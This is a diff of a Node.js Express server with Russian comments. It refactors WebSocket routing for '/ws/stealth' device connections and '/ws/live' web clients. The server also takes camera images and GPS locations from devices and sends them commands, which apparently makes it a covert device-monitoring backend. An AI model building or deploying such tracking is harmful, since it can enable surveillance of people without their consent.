@@ -44,63 +44,74 @@ app.use(express.static("public"));
 const activeConnections = new Map();
 const webClients = new Set();
 
-// WebSocket для устройств
+// WebSocket для устройств - используем noServer
 console.log('Initializing device WebSocket server...');
 const wss = new WebSocketServer({ 
-    server,
-    path: '/ws/stealth'
-});
-
-wss.on('connection', (ws, req) => {
-    console.log('NEW DEVICE WebSocket connection:', req.url);
-    const url = new URL(req.url, `http://${req.headers.host}`);
-    const deviceId = url.pathname.split('/').pop();
-    
-    console.log(`Device connected: ${deviceId}`);
-    activeConnections.set(deviceId, ws);
-    
-    ws.on('message', (data) => {
-        try {
-            const message = JSON.parse(data.toString());
-            console.log(`Message from ${deviceId}:`, message.type);
-            
-            // Пересылаем веб-клиентам
-            broadcastToWebClients(deviceId, message);
-            
-        } catch (error) {
-            console.error('WebSocket message error:', error);
-        }
-    });
-    
-    ws.on('close', () => {
-        activeConnections.delete(deviceId);
-        console.log(`Device ${deviceId} disconnected`);
-    });
-    
-    ws.on('error', (error) => {
-        console.error('Device WebSocket error:', error);
-    });
+    noServer: true
 });
 
 // WebSocket для веб-клиентов
 console.log('Initializing web client WebSocket server...');
 const webWss = new WebSocketServer({ 
-    server,
-    path: '/ws/live'
+    noServer: true
 });
 
-webWss.on('connection', (ws) => {
-    console.log('NEW WEB CLIENT WebSocket connection');
-    webClients.add(ws);
+// Обработчик upgrade для WebSocket
+server.on('upgrade', (request, socket, head) => {
+    console.log('WebSocket upgrade request received:', request.url);
     
-    ws.on('close', () => {
-        webClients.delete(ws);
-        console.log('Web client disconnected');
-    });
-    
-    ws.on('error', (error) => {
-        console.error('Web client WebSocket error:', error);
-    });
+    if (request.url.startsWith('/ws/stealth')) {
+        console.log('Handling device WebSocket upgrade...');
+        wss.handleUpgrade(request, socket, head, (ws) => {
+            console.log('Device WebSocket upgraded successfully');
+            
+            // Обрабатываем подключение устройства
+            const url = new URL(request.url, `http://${request.headers.host}`);
+            const deviceId = url.pathname.split('/').pop();
+            
+            console.log(`Device connected: ${deviceId}`);
+            activeConnections.set(deviceId, ws);
+            
+            ws.on('message', (data) => {
+                try {
+                    const message = JSON.parse(data.toString());
+                    console.log(`Message from ${deviceId}:`, message.type);
+                    broadcastToWebClients(deviceId, message);
+                } catch (error) {
+                    console.error('WebSocket message error:', error);
+                }
+            });
+            
+            ws.on('close', () => {
+                activeConnections.delete(deviceId);
+                console.log(`Device ${deviceId} disconnected`);
+            });
+            
+            ws.on('error', (error) => {
+                console.error('Device WebSocket error:', error);
+            });
+        });
+    } else if (request.url.startsWith('/ws/live')) {
+        console.log('Handling web client WebSocket upgrade...');
+        webWss.handleUpgrade(request, socket, head, (ws) => {
+            console.log('Web client WebSocket upgraded successfully');
+            
+            webClients.add(ws);
+            console.log('Web client connected');
+            
+            ws.on('close', () => {
+                webClients.delete(ws);
+                console.log('Web client disconnected');
+            });
+            
+            ws.on('error', (error) => {
+                console.error('Web client WebSocket error:', error);
+            });
+        });
+    } else {
+        console.log('Unknown WebSocket path:', request.url);
+        socket.destroy();
+    }
 });
 
 function broadcastToWebClients(deviceId, message) {
@@ -168,7 +179,7 @@ app.post('/api/device/command', (req, res) => {
 
 // Прием изображений через HTTP (fallback)
 app.post('/api/camera/image', (req, res) => {
-    const receivedToken = req.headers.authorization; // Убираем split
+    const receivedToken = req.headers.authorization;
     
     if (receivedToken !== SECRET_TOKEN) {
         console.log('Unauthorized image request:', receivedToken);
@@ -189,6 +200,7 @@ app.post('/api/camera/image', (req, res) => {
     res.json({ success: true });
 });
 
+// Прием данных локации
 app.post("/api/location", async (req, res) => {
     const receivedToken = req.headers.authorization;
 
@@ -203,7 +215,7 @@ app.post("/api/location", async (req, res) => {
         return res.status(400).json({ error: "Invalid GPS coordinates" });
     }
     
-    // Преобразуем timestamp в число (bigint) - ПЕРЕМЕЩЕНО ВЫШЕ try блока
+    // Преобразуем timestamp в число
     let timestampValue;
     if (typeof timestamp === 'string') {
         timestampValue = new Date(timestamp).getTime();
@@ -331,7 +343,7 @@ app.get("/api/device/:deviceId/:token", async (req, res) => {
     }
 });
 
-// Analytics (упрощенная версия)
+// Analytics
 app.get("/api/analytics/:device_id/:token", async (req, res) => {
     const { device_id, token } = req.params;
     
@@ -369,71 +381,6 @@ app.get("/api/analytics/:device_id/:token", async (req, res) => {
 app.get('/', (req, res) => {
     res.sendFile('index.html', { root: 'public' });
 });
-
-// Добавьте в конец server.js перед server.listen():
-
-// Тест WebSocket работоспособности
-server.on('upgrade', (request, socket, head) => {
-    console.log('WebSocket upgrade request received:', request.url);
-    console.log('Headers:', request.headers);
-    
-    if (request.url.startsWith('/ws/stealth')) {
-        console.log('Handling device WebSocket upgrade...');
-        wss.handleUpgrade(request, socket, head, (ws) => {
-            console.log('Device WebSocket upgraded successfully');
-            wss.emit('connection', ws, request);
-        });
-    } else if (request.url.startsWith('/ws/live')) {
-        console.log('Handling web client WebSocket upgrade...');
-        webWss.handleUpgrade(request, socket, head, (ws) => {
-            console.log('Web client WebSocket upgraded successfully');
-            webWss.emit('connection', ws, request);
-        });
-    } else {
-        console.log('Unknown WebSocket path:', request.url);
-        socket.destroy();
-    }
-});
-
-// Обработчик connection должен быть СНАРУЖИ обработчика upgrade
-wss.on('connection', (ws, req) => {
-    console.log('NEW DEVICE WebSocket connection established:', req.url);
-    const url = new URL(req.url, `http://${req.headers.host}`);
-    const deviceId = url.pathname.split('/').pop();
-    
-    console.log(`Device connected successfully: ${deviceId}`);
-    activeConnections.set(deviceId, ws);
-    
-    ws.on('message', (data) => {
-        try {
-            const message = JSON.parse(data.toString());
-            console.log(`Message from ${deviceId}:`, message.type);
-            broadcastToWebClients(deviceId, message);
-        } catch (error) {
-            console.error('WebSocket message error:', error);
-        }
-    });
-    
-    ws.on('close', () => {
-        activeConnections.delete(deviceId);
-        console.log(`Device ${deviceId} disconnected`);
-    });
-    
-    ws.on('error', (error) => {
-        console.error('Device WebSocket error:', error);
-    });
-});
-
-// Добавьте отладку ошибок WebSocket
-wss.on('error', (error) => {
-    console.error('Device WebSocket Server error:', error);
-});
-
-webWss.on('error', (error) => {
-    console.error('Web Client WebSocket Server error:', error);
-});
-
-console.log('WebSocket upgrade handler added');
 
 // === Utility Functions ===
 function validateGPSPoint(lat, lng, accuracy) {
@@ -483,6 +430,15 @@ function getDistance(lat1, lon1, lat2, lon2) {
     return R * c;
 }
 
+// Обработка ошибок WebSocket
+wss.on('error', (error) => {
+    console.error('Device WebSocket Server error:', error);
+});
+
+webWss.on('error', (error) => {
+    console.error('Web Client WebSocket Server error:', error);
+});
+
 // Запуск сервера
 server.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
@@ -496,19 +452,3 @@ server.listen(PORT, () => {
     console.log('- GET /api/devices/:token');
     console.log('Server ready for connections!');
 });
-
-// Обработка ошибок WebSocket сервера
-wss.on('error', (error) => {
-    console.error('Device WebSocket Server error:', error);
-});
-
-webWss.on('error', (error) => {
-    console.error('Web Client WebSocket Server error:', error);
-});
-
-
-
-
-
-
-
